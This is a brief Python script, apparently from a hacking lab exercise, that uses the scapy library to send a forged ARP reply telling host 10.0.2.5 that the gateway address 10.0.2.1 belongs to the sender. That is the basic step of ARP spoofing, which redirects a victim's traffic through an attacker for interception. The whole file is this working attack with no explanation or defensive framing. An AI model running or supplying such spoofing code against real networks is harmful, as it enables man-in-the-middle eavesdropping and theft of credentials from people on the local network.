#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="10.0.2.5", hwdst="08:00:27:0a:03:ef", psrc="10.0.2.1")
scapy.send(packet)
